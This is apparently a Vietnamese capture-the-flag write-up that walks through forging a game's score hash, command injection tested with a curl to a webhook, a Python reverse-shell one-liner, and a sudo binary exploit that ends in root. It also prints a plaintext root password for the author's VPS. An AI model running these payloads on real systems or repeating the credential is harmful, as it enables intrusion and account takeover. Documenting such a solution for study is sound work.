# EHC Chirtsmas 2

## Phase1: 

- Dùng wireshark bắt tập tin của game

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/b339bd83-3b59-4516-b72e-1a232ec4a17a)


- Check được request của game gửi lên server:

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/929eb871-2fd0-4586-9ee1-e8d1cd236d4d)


Check code thì thấy đoạn hash ( sử dụng dotPeek để mở code vì file code là .Net)

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/a2d1830f-da98-4c82-a8f3-25052960befc)


Code lại hàm hash

```python
import requests
import hashlib
import json

class PlayerStatus:
    def __init__(self):
        self.mssv = ""
        self.score = ""
        self.md5 = ""
        self.access_token = ""

class Game:
    def __init__(self):
        self.player = PlayerStatus()
        self.url = "http://165.22.60.153/"

    def request_token(self):
        # Prepare and send the HTTP request for token
        data = {'mssv': self.player.mssv}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(self.url + "auth", headers=headers, json=data)

        if response.status_code == 200:

         # Deserialize the response content to get the token
            token_data = response.json()
            self.player.access_token = token_data.get('access_token', '')
            return True
        else:
            return False

    def send_score(self):
        mssv = self.player.mssv
        score = self.player.score
        alpha = "abcdefghijklmnopqrstuvwxyz01234"
        md5 = hashlib.md5()

        # Constructing the string from mssv
        temp = "FU" + ''.join([mssv[i] for i in [5, 6, 2, 4, 7, 0, 3, 1]])
        
        # Bit manipulation and MD5 hash generation
        arr = [0] * 16
        j = 0
        for i in range(0, 16, 8):
            arr[i] = ord(temp[j]) >> 3 & 31
            arr[i + 1] = (ord(temp[j]) << 2 | ord(temp[j + 1]) >> 6) & 31
            arr[i + 2] = ord(temp[j + 1]) >> 1 & 31
            arr[i + 3] = (ord(temp[j + 1]) << 4 | ord(temp[j + 2]) >> 4) & 31
            arr[i + 4] = (ord(temp[j + 2]) << 1 | ord(temp[j + 3]) >> 7) & 31
            arr[i + 5] = ord(temp[j + 3]) >> 2 & 31
            arr[i + 6] = (ord(temp[j + 3]) << 3 | ord(temp[j + 4]) >> 5) & 31
            arr[i + 7] = ord(temp[j + 4]) & 31
            j += 5

        arr2 = [ord(alpha[i]) for i in arr]
        arr3 = [ord(c) ^ 105 for c in score]

        # Combining and hashing the arrays
        res = arr2 + arr3
        buffer = bytes(res)
        md5.update(buffer)
        self.player.md5 = md5.hexdigest()
        print("Hash:", self.player.md5)

        # Prepare and send the HTTP request
        headers = {'Authorization': f'Bearer {self.player.access_token}'}
        print("token:", headers)
        data = {'score': self.player.score, 'hash': self.player.md5}
        response = requests.post(self.url + "score", headers=headers, json=data)
        return response.text

# Example usage
game = Game()

# User input for MSSV and score
game.player.mssv = input("Enter your MSSV (student ID): ")
game.player.score = input("Enter your score: ")

# Request token
if game.request_token():
    print("Token acquired successfully.")
    response_content = game.send_score()
    print("Response:",response_content)
else:
    print("Failed to acquire token.")

```

- Từ đoạn code này ta có thể can thiệp điểm số trên server của mỗi MSSV có thể sửa chỉnh tùy ý

## Phase 2:

- Sau khi đã can thiệp vào chỉnh sửa điểm thì ta có thể khẳng định đây là chain để khai thác. Nhưng sau khi thử 7749 các payload chỉnh số, bof, dùng hex thì nhận được thông báo lỗi là “score must be integer”

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/129b627c-27e0-4089-a70e-ce694cadf749)


- Tới đây cũng khá stuck nhưng mình nghĩ tới một loại lỗ hổng cũng hay được sử dụng trong các tình huống như thế này là `command injection` vì từ đầu author đã nói RE → RCE → Leo Root nên mình nghĩ ngay tới trường hợp này. Nhưng mình cũng đã thử và hầu như bị giống lỗi tới trên ảnh.

- Mình thử dùng webhook xem liệu có thể curl đc về không

Payload:  curl https://webhook.site/290976bf-bd78-4269-ad3a-8465aba5b3ad

Chạy code ta sẽ thấy có thông báo pop về webhook nhưng không có content, đó cũng chính dấu hiệu để ta nghĩ tới reverse shell:

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/7656b8d3-0dec-438e-b288-5d6ce32ac722)


Shell: 

https://www.revshells.com/

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_vps",your_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- Ở đây ta có thể dùng nc -lvnp port bất kỳ để có thể dùng cho vps

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/4441047c-8a9e-4487-927d-2c773dbdf11e/ca261e48-878a-4a21-b437-ea4eeba97415/Untitled.png)

Vdu ở đây mình có 1 vps 

karim: [206.189.32.66](https://l.facebook.com/l.php?u=http%3A%2F%2F206.189.32.66%2F%3Ffbclid%3DIwAR1J4Rn3sSYoq2Sau9ill_kK3p6v-E4DyYG7DGdAkg-wnZYQrJKIvjVZ438&h=AT0JdfaMHEEKz-3sAhUF8wj3iBaI5iaoOU0Etjg-DnW3p9sYVBQsEOGD4R1ZEM9Br5ExZd88fZva_sqLNsTqWh1vlf_wvNBn9tv2HADUkqrr22jDtiXeMogBvBSXK5JCzRKvhg)

user: root
password: 2FGRrD3KaFrxUrCJFuaQp

Tạo 1 port để reverse shell vô 

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/120d7a86-1df2-4436-b011-866ec11da156)


Revshell thành công 

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/3971502a-1c9c-45e4-a324-1502da6acd2d)

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/d9bb0b07-540f-4e70-8f0b-af1bb3407ea3)


- Đi dạo một vòng lật tung server ta sẽ khó có thể thấy điều gì khả nghi, lúc này thử sudo su nhưng không được nên mình thử sudo -l

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/86453440-b210-45d9-88b9-8f4f374a6b2d)


- Mình thấy nó hiện NOPASSWD: /bin/gift nên thử xem thì biết đó là 1 file execute của linux.


## Phase3: 

- Sau khi có được file gift mình bắt đầu reverse file này, nó là elf64, yêu cầu 2 argument lúc chạy một cái là tên một cái là wish number, r lúc chạy yêu cầu nhập thêm 1 số, rồi sau đó gọi hàm check.

- Debug một hồi thì phân tích nhẹ sau:

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/8e463a55-ff29-45b5-883b-717bbf62f698)


- Ý đồ của tác giả muốn nhảy đến là chỗ leave rax, forma, mà trong code k có chỗ nào gọi cái hàm này. Nên là mk nghĩ đến lệnh ret để return đến một địa chỉ trên stack, mà trong các function đc gọi có dùng input từ mk chỉ có 1 function có lệnh ret thôi chính. Vậy nên mình phải sửa đc địa chỉ return của hàm này để point đến địa chỉ mình trả về. Cụ thể địa chỉ mình muốn trở về có đuôi là 0x56 cái chỗ đã nói ở trên và trong cái hàm có lệnh ret, có 1 chỗ cho phép mình có thể ghi vào 1 vùng nhớ đc tính toán dựa trên input mình nhập vào.

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/c0f15fbb-e68c-4b4d-8ccd-db1c0c87a9c1)


- Địa chỉ pointer_name với địa chỉ của cái mk trỏ đến là đc hardcode dựa vào cùng 1 base và mình tính độ lệnh giữa 2 chỗ này thì wish_number tính được là -40. Debug đoạn code tên tìm đc giá trị của `pointer_name` ( cái này mình đặt cho dễ hiểu ). Trong ida thì nó là địa chỉ của biến dest trong IDA và nó tính là địa chỉ của pointer_name + giá trị của wishnumber. Chính là địa chỉ sẽ đc ghi đè giá trị processed_number, là cái number mk enter vào sau đó. Và mình đang muốn ghi đề giá trị trả về của hàm này trên debuger mình sẽ xác định đc địa chỉ trả về của hàm này. Địa chỉ trả về của hàm này cách địa chỉ trả về của ida một khoảng k đổi = -40, -40 ở đây giúp ta nhảy đến địa chỉ trả về của function đang đc gọi.

- Sau đó mình sẽ sửa được địa chỉ trả về còn 57. Chỗ yêu cầu mình nhập vào thì nó gọi 1 hàm thay đổi cái input đấy và muốn ghi vào giá trị 0xd6. Hàm ý sẽ thực hiện là `x+157` thì tìm được `x=57` .

- Sau khi phân tích sau điều kiện cần và đủ ta sẽ thực hiện rce bằng reverse shell vào server sau đó sử dụng command sau:

       

        Payload: `sudo /bin/gift hacked wishhh -40` 

****

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/afe0d447-47d7-4437-a9a5-853124427189)


- cd /root

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/740e02df-16d3-4051-b108-eca1518c2dc4)


- Tìm được 2 file trong root và đọc root.txt đã thấy flag

![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/2d517603-445f-4e13-9988-2d2b1bc81207)


![image](https://github.com/jiyuumarinshi/CTF-Wups/assets/93731698/ad64d769-8c94-4c70-ace6-abde509eb2b5)


- Mình sẽ phân tích tiếp rất nhiều điều thú vị của thử thách này, còn rất nhiều điều mình muốn nói tạm viết lại để đỡ quên hehe~~coming soon~~
